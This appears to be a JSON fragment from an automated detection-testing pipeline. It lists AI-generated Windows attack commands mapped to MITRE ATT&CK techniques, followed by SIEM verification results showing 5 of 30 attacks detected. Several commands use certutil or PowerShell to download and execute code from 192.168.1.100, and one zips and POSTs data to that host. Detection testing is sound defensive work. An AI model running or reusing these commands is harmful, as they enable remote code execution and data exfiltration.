      "validated": true
    },
    {
      "id": "802bb912-9572-4380-bcbe-ba70c8f92ac6",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& cmd /c 'dir %TEMP%\\\\*.tmp /b > %TEMP%\\\\tmp_list.txt' ; $data = Get-Content '%TEMP%\\\\tmp_list.txt' | Out-String; $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)); $archivePath = '%TEMP%\\\\archive_' + (Get-Date -Format 'MMddHHmm') + '.txt'; Set-Content -Path $archivePath -Value $encoded -Force\"",
      "description": "List temporary files, encode their names in Base64, and save to a timestamped archive file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Uses cmd to list .tmp files, reads output via PowerShell, encodes content in Base64, and writes to a uniquely named .txt file in TEMP with timestamp. Simulates lightweight data aggregation and encoding for exfiltration.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:54.605408",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7dc517d2-d3ed-47f6-87c0-9b7b2e442f69",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/malware.exe %TEMP%\\\\update.exe && %TEMP%\\\\update.exe",
      "description": "Download and execute a malicious executable using certutil, a built-in Windows utility commonly abused for file transfer.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "certutil downloads the file from the specified URL to the temp directory and executes it. Network connection and file creation in %TEMP% expected.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:55.388486",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7477cf27-0bcd-4212-af42-7daafae137fe",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient, a common method for executing remote code.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell downloads and executes the script from the given URL. Network connection initiated and script runs in memory.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:55.388486",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2a1959ef-f18b-49d4-9f9c-27c0356fcfbf",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "User Execution: Malicious File",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\sensitive_data -DestinationPath %TEMP%\\\\archive.zip -Force; Invoke-WebRequest -Uri http://192.168.1.100/upload -Method POST -InFile %TEMP%\\\\archive.zip\"",
      "description": "Archive sensitive data and exfiltrate via HTTP POST using PowerShell and Invoke-WebRequest.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a ZIP archive of the specified folder and uploads it to the attacker-controlled server. File created in %TEMP% and network transmission occurs.",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:55.388486",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    }
  ],
  "siem_verification": [
    {
      "rule_id": "eb97eb4a-1bbb-45d7-96bd-b88aef560f4f",
      "attack_id": "51bde7f9-2e52-460d-a46c-48aadd0e4f6a",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 511.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "73fe830d-54bd-4784-a370-d3c166299243",
      "attack_id": "b54d682d-ccb1-47eb-a84a-d821efa6fe32",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 465.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "f1f8f8f5-fb91-4e48-8c59-40caffbeb91a",
      "attack_id": "cd3e771d-739d-4408-89da-daf197bb35a5",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 419.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "4d8123db-00a6-4001-99e9-e161b3c92c9a",
      "attack_id": "411bb8e2-65fb-49af-9de5-6efa3879af15",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 477.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "580f86be-bffb-453b-9b7d-a6643af2ad54",
      "attack_id": "3db52303-fa2b-409c-b39a-c66bdc85fed1",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 468.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "659a7e12-03ca-4193-a4b1-5d83c50bd7b2",
      "attack_id": "83945259-2133-4397-ba5d-abd3b4cfe548",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 494.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "2d788940-4f44-4698-8c59-e44cc7dcdfbf",
      "attack_id": "04ff133e-9680-4b7f-965f-8d183d5f9047",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 439.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "6449b3d3-796c-4762-8711-e01487acf989",
      "attack_id": "ecd203a5-60a1-4885-86c7-feaf4f29452b",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 469.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "de8c2dff-0c1c-42e8-ade9-e2967f1c2775",
      "attack_id": "9c94c85a-a196-4a0d-b933-e45519c3e073",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 549.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7bb6cebe-efb6-436e-938e-83c70c4245da",
      "attack_id": "0be235f7-4d2d-4816-b0d8-3afcbd1264d2",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 583.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "bc4fc587-d3b5-4009-8195-1d64ea485b80",
      "attack_id": "deac2f92-1824-4522-9ec3-2ef8162568f9",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 518.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7ffee057-da87-4130-9978-72eefac95747",
      "attack_id": "f9002526-ca33-479a-add0-c2b9f7a24db1",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 467.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "7a4e6d28-d883-4650-be56-001e894ddf2c",
      "attack_id": "121dcaaf-215c-4be9-961d-367f313474af",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 485.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "536d53c8-2cee-485d-ab9a-e534e7bd5852",
      "attack_id": "5ededc71-9a04-4f88-b68e-43c9c0f9ac11",
      "detected": true,
      "events_found": 48,
      "historical_events": 0,
      "query_time_ms": 559.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "2ea3e985-54ef-4321-9f0a-aa979d391d10",
      "attack_id": "cbd15c7b-b368-47d9-91a8-c828fdea22b0",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 493.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a7cfe310-67be-4dc3-9220-6427e4e8de3d",
      "attack_id": "b1444203-3a78-4507-921a-ff0bdd610dfa",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 428.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1029a380-b0b8-4d2f-aa00-929d476f25cc",
      "attack_id": "432e4713-7560-4761-9e36-7cac19429035",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 456.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "12f1ff28-59b2-47fa-b715-01207ed3f9f0",
      "attack_id": "1a9a55d8-7316-451d-944e-48cf9f8e1f38",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 430.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "1a1b803f-1d3d-40b5-a17c-df120be80cf3",
      "attack_id": "e55fd1f7-d46e-49c7-b3b6-21da7ff78025",
      "detected": true,
      "events_found": 52,
      "historical_events": 0,
      "query_time_ms": 1215.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "3b9ca2ea-ffd6-4211-a9ac-01f12c0d6fcc",
      "attack_id": "f2a1c65b-dde2-468c-b3c8-d8d06f67701f",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 695.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "61aff9e2-bc89-4104-8d7f-55be61258746",
      "attack_id": "97c60ecc-b28d-4849-95d6-87d9ac0d35de",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 485.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ed88ae9f-ab61-4f41-81ea-d90649f8081a",
      "attack_id": "ffa661dd-eb0c-4b5c-bafa-b9c2fb3fb31a",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 539.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "e6532b59-0483-4551-8d72-b2a808e1165a",
      "attack_id": "7b7921d1-57e1-41e1-98c1-b15aa4c59ddf",
      "detected": true,
      "events_found": 56,
      "historical_events": 0,
      "query_time_ms": 552.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "c5c16565-c303-4c95-ae00-c232294c1ae9",
      "attack_id": "f5a7a7bb-bced-4754-9a7d-93b45f561723",
      "detected": true,
      "events_found": 56,
      "historical_events": 0,
      "query_time_ms": 604.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "784b16d8-4a76-41c8-8f64-470e4781a270",
      "attack_id": "384e5393-f628-4cd3-bd90-92a24c93416d",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 462.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "97265f44-12ad-4d5d-995f-488db57de516",
      "attack_id": "f1500b12-3ffc-4efd-a11c-e6667f065869",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 574.0000000000001,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "a14fd223-3402-45db-9191-99d672405de1",
      "attack_id": "f0104d4f-e222-453c-a5b4-e6ffd4ee1ef8",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 479.00000000000006,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "3c61cd6d-1154-4718-accc-89e3195a1288",
      "attack_id": "7c1d80dc-88cc-4e0a-8996-c6bd9fb14879",
      "detected": true,
      "events_found": 52,
      "historical_events": 0,
      "query_time_ms": 499.0,
      "status": "success",
      "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
    },
    {
      "rule_id": "2f95eda2-56e8-4bfe-9ad8-59c4e8427e17",
      "attack_id": "83425f0c-298b-4e7e-b521-4e21d1fc9f71",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 488.0,
      "status": "success",
      "message": "Verification complete"
    },
    {
      "rule_id": "ef8c18c5-c12f-48fe-bf5c-ce78964627d0",
      "attack_id": "0a03f133-d45c-46c1-8dee-eed3bf2677a7",
      "detected": false,
      "events_found": 0,
      "historical_events": 0,
      "query_time_ms": 440.0,
      "status": "success",
      "message": "Verification complete"
    }
  ],
  "siem_metrics": {
    "true_positives": 5,
    "false_positives": 0,
    "false_negatives": 25,
    "true_negatives": 0,
    "precision": 1.0,
    "recall": 0.16666666666666666,
    "f1_score": 0.2857142857142857,
    "accuracy": 0.16666666666666666,
    "detection_rate": 0.16666666666666666,
    "false_positive_rate": 0.0
  },
  "iterations": 3,
  "final_score": 0.53,
  "timestamp": "2025-12-23T00:23:13.447014"
}